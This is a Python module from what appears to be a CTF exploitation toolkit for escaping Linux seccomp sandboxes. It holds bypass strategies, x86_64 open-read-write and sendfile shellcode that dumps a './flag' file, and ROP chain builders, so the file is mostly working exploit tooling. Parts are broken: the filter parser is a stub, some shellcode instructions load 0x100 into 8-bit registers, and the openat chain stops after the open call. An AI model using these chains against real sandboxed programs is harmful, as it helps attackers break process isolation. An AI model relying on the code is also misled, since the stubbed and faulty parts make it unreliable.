"""
Advanced Seccomp Bypass Module.

Provides comprehensive seccomp bypass techniques including:
- Syscall filtering analysis
- Alternative syscall discovery
- ORW (Open-Read-Write) chain building
- Advanced bypass strategies
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from enum import Enum, auto

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class SeccompAction(Enum):
    """Seccomp filter actions."""
    KILL = 0x00000000
    TRAP = 0x00030000
    ERRNO = 0x00050000
    TRACE = 0x7ff00000
    LOG = 0x7ffc0000
    ALLOW = 0x7fff0000


class SyscallCategory(Enum):
    """Categories of syscalls for analysis."""
    FILE_READ = auto()
    FILE_WRITE = auto()
    FILE_OPEN = auto()
    EXECUTE = auto()
    NETWORK = auto()
    MEMORY = auto()
    PROCESS = auto()
    INFO = auto()
    SIGNAL = auto()
    OTHER = auto()


@dataclass
class SeccompRule:
    """A single seccomp rule."""
    syscall_nr: int
    syscall_name: str
    action: SeccompAction
    arg_checks: List[Tuple[int, str, int]] = field(default_factory=list)  # (argN, op, value)


@dataclass
class SeccompAnalysis:
    """Complete seccomp analysis result."""
    rules: List[SeccompRule]
    allowed_syscalls: Set[str]
    blocked_syscalls: Set[str]
    arg_filtered: Set[str]  # Syscalls allowed with arg restrictions
    bypass_strategies: List['BypassStrategy']
    can_orw: bool = False
    can_execve: bool = False
    can_mprotect: bool = False
    notes: List[str] = field(default_factory=list)


@dataclass
class BypassStrategy:
    """A seccomp bypass strategy."""
    name: str
    description: str
    feasibility: str  # HIGH, MEDIUM, LOW
    required_syscalls: List[str]
    chain_template: Optional[str] = None
    notes: List[str] = field(default_factory=list)


# x86_64 syscall numbers
SYSCALL_X64 = {
    'read': 0, 'write': 1, 'open': 2, 'close': 3, 'stat': 4,
    'fstat': 5, 'lstat': 6, 'poll': 7, 'lseek': 8, 'mmap': 9,
    'mprotect': 10, 'munmap': 11, 'brk': 12, 'rt_sigaction': 13,
    'ioctl': 16, 'pread64': 17, 'pwrite64': 18, 'readv': 19,
    'writev': 20, 'access': 21, 'pipe': 22, 'select': 23,
    'dup': 32, 'dup2': 33, 'nanosleep': 35, 'getpid': 39,
    'sendfile': 40, 'socket': 41, 'connect': 42, 'accept': 43,
    'sendto': 44, 'recvfrom': 45, 'sendmsg': 46, 'recvmsg': 47,
    'shutdown': 48, 'bind': 49, 'listen': 50, 'getsockname': 51,
    'fork': 57, 'vfork': 58, 'execve': 59, 'exit': 60,
    'wait4': 61, 'kill': 62, 'uname': 63, 'fcntl': 72,
    'flock': 73, 'fsync': 74, 'getdents': 78, 'getcwd': 79,
    'chdir': 80, 'rename': 82, 'mkdir': 83, 'rmdir': 84,
    'creat': 85, 'link': 86, 'unlink': 87, 'symlink': 88,
    'readlink': 89, 'chmod': 90, 'chown': 92, 'getuid': 102,
    'getgid': 104, 'setuid': 105, 'setgid': 106, 'geteuid': 107,
    'getegid': 108, 'getppid': 110, 'getpgrp': 111, 'setsid': 112,
    'ptrace': 101, 'prctl': 157, 'arch_prctl': 158,
    'openat': 257, 'mkdirat': 258, 'fstatat': 262, 'unlinkat': 263,
    'readlinkat': 267, 'fchmodat': 268, 'faccessat': 269,
    'dup3': 292, 'pipe2': 293, 'preadv': 295, 'pwritev': 296,
    'sendmmsg': 307, 'process_vm_readv': 310, 'process_vm_writev': 311,
    'execveat': 322, 'openat2': 437,
}

SYSCALL_X64_REV = {v: k for k, v in SYSCALL_X64.items()}


class AdvancedSeccompAnalyzer:
    """
    Advanced seccomp filter analyzer.

    Provides:
    - Detailed syscall categorization
    - Bypass strategy discovery
    - ORW chain building
    - Alternative syscall mapping
    """

    # Syscall categories
    CATEGORIES = {
        SyscallCategory.FILE_READ: ['read', 'pread64', 'readv', 'preadv', 'recvfrom', 'recvmsg'],
        SyscallCategory.FILE_WRITE: ['write', 'pwrite64', 'writev', 'pwritev', 'sendto', 'sendmsg'],
        SyscallCategory.FILE_OPEN: ['open', 'openat', 'openat2', 'creat'],
        SyscallCategory.EXECUTE: ['execve', 'execveat'],
        SyscallCategory.NETWORK: ['socket', 'connect', 'accept', 'bind', 'listen', 'sendfile'],
        SyscallCategory.MEMORY: ['mmap', 'mprotect', 'munmap', 'brk', 'mremap'],
        SyscallCategory.PROCESS: ['fork', 'vfork', 'clone', 'clone3', 'kill', 'wait4'],
        SyscallCategory.INFO: ['getuid', 'getgid', 'getpid', 'getppid', 'uname'],
    }

    # Alternative syscalls for common operations
    ALTERNATIVES = {
        'open': ['openat', 'openat2', 'creat'],
        'read': ['pread64', 'readv', 'preadv', 'recvfrom'],
        'write': ['pwrite64', 'writev', 'pwritev', 'sendto'],
        'execve': ['execveat'],
        'mmap': ['mremap'],
    }

    def __init__(self, bits: int = 64):
        """
        Initialize analyzer.

        Args:
            bits: Architecture bits
        """
        self.bits = bits
        self.syscalls = SYSCALL_X64 if bits == 64 else {}

    def analyze_filter(self, filter_data: bytes) -> SeccompAnalysis:
        """
        Analyze a seccomp BPF filter.

        Args:
            filter_data: Raw BPF filter data

        Returns:
            SeccompAnalysis result
        """
        rules = self._parse_bpf_filter(filter_data)

        # Categorize syscalls
        allowed = set()
        blocked = set()
        arg_filtered = set()

        for rule in rules:
            if rule.action == SeccompAction.ALLOW:
                if rule.arg_checks:
                    arg_filtered.add(rule.syscall_name)
                else:
                    allowed.add(rule.syscall_name)
            elif rule.action in (SeccompAction.KILL, SeccompAction.ERRNO):
                blocked.add(rule.syscall_name)

        # Find bypass strategies
        strategies = self._find_bypass_strategies(allowed, arg_filtered)

        # Check key capabilities
        can_orw = self._check_orw_capability(allowed, arg_filtered)
        can_execve = 'execve' in allowed or 'execveat' in allowed
        can_mprotect = 'mprotect' in allowed

        analysis = SeccompAnalysis(
            rules=rules,
            allowed_syscalls=allowed,
            blocked_syscalls=blocked,
            arg_filtered=arg_filtered,
            bypass_strategies=strategies,
            can_orw=can_orw,
            can_execve=can_execve,
            can_mprotect=can_mprotect,
        )

        # Add notes
        if can_orw:
            analysis.notes.append("ORW chain possible - can read flag file")
        if can_execve:
            analysis.notes.append("execve allowed - can spawn shell")
        if can_mprotect:
            analysis.notes.append("mprotect allowed - can make shellcode executable")

        return analysis

    def _parse_bpf_filter(self, data: bytes) -> List[SeccompRule]:
        """Parse BPF filter into rules."""
        rules = []

        # BPF instruction format: 8 bytes each
        # struct sock_filter { u16 code; u8 jt; u8 jf; u32 k; }

        if len(data) < 8:
            return rules

        # Simplified parsing - full implementation would trace BPF program
        # For now, look for common patterns

        # This is a placeholder - real implementation needs full BPF interpreter
        return rules

    def _find_bypass_strategies(
        self,
        allowed: Set[str],
        arg_filtered: Set[str],
    ) -> List[BypassStrategy]:
        """Find viable bypass strategies."""
        strategies = []

        # Strategy 1: ORW (Open-Read-Write)
        if self._check_orw_capability(allowed, arg_filtered):
            strategies.append(BypassStrategy(
                name="ORW Chain",
                description="Open flag, read contents, write to stdout",
                feasibility="HIGH",
                required_syscalls=["open/openat", "read", "write"],
                chain_template=self._gen_orw_template(),
            ))

        # Strategy 2: Sendfile
        if 'sendfile' in allowed and any(x in allowed for x in ['open', 'openat']):
            strategies.append(BypassStrategy(
                name="Sendfile",
                description="Open flag and sendfile to stdout",
                feasibility="HIGH",
                required_syscalls=["open/openat", "sendfile"],
                chain_template=self._gen_sendfile_template(),
            ))

        # Strategy 3: mprotect + shellcode
        if 'mprotect' in allowed:
            strategies.append(BypassStrategy(
                name="mprotect RWX",
                description="Make memory executable and run shellcode",
                feasibility="HIGH",
                required_syscalls=["mprotect"],
                notes=["Need writable memory region"],
            ))

        # Strategy 4: Process VM operations
        if 'process_vm_readv' in allowed:
            strategies.append(BypassStrategy(
                name="Process VM Read",
                description="Read flag from another process memory",
                feasibility="LOW",
                required_syscalls=["process_vm_readv"],
                notes=["Requires suitable target process"],
            ))

        # Strategy 5: x32 ABI bypass (if 32-bit syscalls allowed)
        strategies.append(BypassStrategy(
            name="x32 ABI Bypass",
            description="Use x32 ABI (syscall | 0x40000000) to bypass filters",
            feasibility="MEDIUM",
            required_syscalls=[],
            notes=["Only works if filter doesn't check arch"],
        ))

        return strategies

    def _check_orw_capability(self, allowed: Set[str], arg_filtered: Set[str]) -> bool:
        """Check if ORW chain is possible."""
        # Need open (or alternative)
        can_open = any(s in allowed or s in arg_filtered
                       for s in ['open', 'openat', 'openat2'])

        # Need read (or alternative)
        can_read = any(s in allowed or s in arg_filtered
                       for s in ['read', 'pread64', 'readv'])

        # Need write (or alternative)
        can_write = any(s in allowed or s in arg_filtered
                        for s in ['write', 'pwrite64', 'writev'])

        return can_open and can_read and can_write

    def _gen_orw_template(self) -> str:
        """Generate ORW chain template."""
        return '''
# ORW (Open-Read-Write) Shellcode/ROP Chain
# x86_64 syscalls

# 1. Open the flag file
# fd = open("./flag", O_RDONLY)
# syscall: rax=2 (open), rdi="./flag", rsi=0 (O_RDONLY)

# 2. Read flag contents
# read(fd, buf, 0x100)
# syscall: rax=0 (read), rdi=fd, rsi=buf, rdx=0x100

# 3. Write to stdout
# write(1, buf, 0x100)
# syscall: rax=1 (write), rdi=1, rsi=buf, rdx=0x100

# Shellcode version:
orw_shellcode = asm("""
    /* open("./flag", 0) */
    xor rsi, rsi
    push rsi
    mov rdi, 0x67616c662f2e  /* "./flag" */
    push rdi
    mov rdi, rsp
    xor rax, rax
    mov al, 2
    syscall

    /* read(fd, rsp, 0x100) */
    mov rdi, rax
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 0x100
    xor rax, rax
    syscall

    /* write(1, rsp, 0x100) */
    xor rdi, rdi
    inc rdi
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 0x100
    xor rax, rax
    inc rax
    syscall
""")
'''

    def _gen_sendfile_template(self) -> str:
        """Generate sendfile bypass template."""
        return '''
# Sendfile bypass - fewer syscalls needed

# 1. Open the flag file
# fd = open("./flag", O_RDONLY)

# 2. Sendfile to stdout
# sendfile(stdout, fd, NULL, 0x100)
# syscall: rax=40, rdi=1, rsi=fd, rdx=0, r10=0x100

sendfile_shellcode = asm("""
    /* open("./flag", 0) */
    xor rsi, rsi
    push rsi
    mov rdi, 0x67616c662f2e
    push rdi
    mov rdi, rsp
    xor rax, rax
    mov al, 2
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rsi, rax
    xor rdi, rdi
    inc rdi
    xor rdx, rdx
    xor r10, r10
    mov r10b, 0x100
    xor rax, rax
    mov al, 40
    syscall
""")
'''

    def find_alternative_syscall(self, blocked: str) -> List[str]:
        """
        Find alternative syscalls for a blocked one.

        Args:
            blocked: Blocked syscall name

        Returns:
            List of alternative syscalls
        """
        return self.ALTERNATIVES.get(blocked, [])


class ORWChainBuilder:
    """
    Builds ORW (Open-Read-Write) ROP chains.

    Handles different scenarios:
    - Standard ORW
    - openat-based (when open is blocked)
    - pread/pwrite variants
    """

    def __init__(self, bits: int = 64):
        """Initialize chain builder."""
        self.bits = bits
        self.word_size = bits // 8

    def build_rop_orw(
        self,
        pop_rdi: int,
        pop_rsi: int,
        pop_rdx: int,
        pop_rax: int,
        syscall_ret: int,
        flag_path_addr: int,
        buffer_addr: int,
        read_size: int = 0x100,
    ) -> bytes:
        """
        Build ORW ROP chain.

        Args:
            pop_rdi: pop rdi; ret gadget
            pop_rsi: pop rsi; ret gadget (or pop rsi; pop r15; ret)
            pop_rdx: pop rdx; ret gadget
            pop_rax: pop rax; ret gadget
            syscall_ret: syscall; ret gadget
            flag_path_addr: Address of flag path string
            buffer_addr: Writable buffer for read data
            read_size: How many bytes to read

        Returns:
            ROP chain bytes
        """
        try:
            from pwn import p64
        except ImportError:
            def p64(x):
                return x.to_bytes(8, 'little')

        chain = b''

        # 1. open(flag_path, O_RDONLY)
        chain += p64(pop_rdi)
        chain += p64(flag_path_addr)
        chain += p64(pop_rsi)
        chain += p64(0)  # O_RDONLY
        chain += p64(0)  # r15 padding if needed
        chain += p64(pop_rax)
        chain += p64(2)  # syscall number for open
        chain += p64(syscall_ret)

        # fd is now in rax, but we need it in rdi
        # If we have mov rdi, rax; ret that's ideal
        # Otherwise need creative solution

        # 2. read(fd, buffer, read_size)
        # Assuming fd=3 (typical first available fd)
        chain += p64(pop_rdi)
        chain += p64(3)  # fd
        chain += p64(pop_rsi)
        chain += p64(buffer_addr)
        chain += p64(0)  # r15
        chain += p64(pop_rdx)
        chain += p64(read_size)
        chain += p64(pop_rax)
        chain += p64(0)  # syscall number for read
        chain += p64(syscall_ret)

        # 3. write(1, buffer, read_size)
        chain += p64(pop_rdi)
        chain += p64(1)  # stdout
        chain += p64(pop_rsi)
        chain += p64(buffer_addr)
        chain += p64(0)  # r15
        chain += p64(pop_rdx)
        chain += p64(read_size)
        chain += p64(pop_rax)
        chain += p64(1)  # syscall number for write
        chain += p64(syscall_ret)

        return chain

    def build_openat_variant(
        self,
        gadgets: Dict[str, int],
        flag_path_addr: int,
        buffer_addr: int,
    ) -> bytes:
        """
        Build ORW chain using openat instead of open.

        Useful when open is blocked but openat is allowed.
        """
        try:
            from pwn import p64
        except ImportError:
            def p64(x):
                return x.to_bytes(8, 'little')

        chain = b''

        # openat(AT_FDCWD, path, flags) = openat(-100, path, 0)
        chain += p64(gadgets['pop_rdi'])
        chain += p64(0xffffffffffffff9c)  # AT_FDCWD = -100
        chain += p64(gadgets['pop_rsi'])
        chain += p64(flag_path_addr)
        chain += p64(0)
        chain += p64(gadgets['pop_rdx'])
        chain += p64(0)  # O_RDONLY
        chain += p64(gadgets['pop_rax'])
        chain += p64(257)  # openat syscall number
        chain += p64(gadgets['syscall_ret'])

        # Rest is same as standard ORW
        # ... read and write

        return chain


def analyze_seccomp(binary_path: str) -> SeccompAnalysis:
    """
    Convenience function to analyze seccomp in a binary.

    Args:
        binary_path: Path to binary

    Returns:
        SeccompAnalysis result
    """
    # This would need to run the binary and extract the filter
    # Placeholder implementation
    analyzer = AdvancedSeccompAnalyzer()
    return SeccompAnalysis(
        rules=[],
        allowed_syscalls=set(),
        blocked_syscalls=set(),
        arg_filtered=set(),
        bypass_strategies=[],
    )
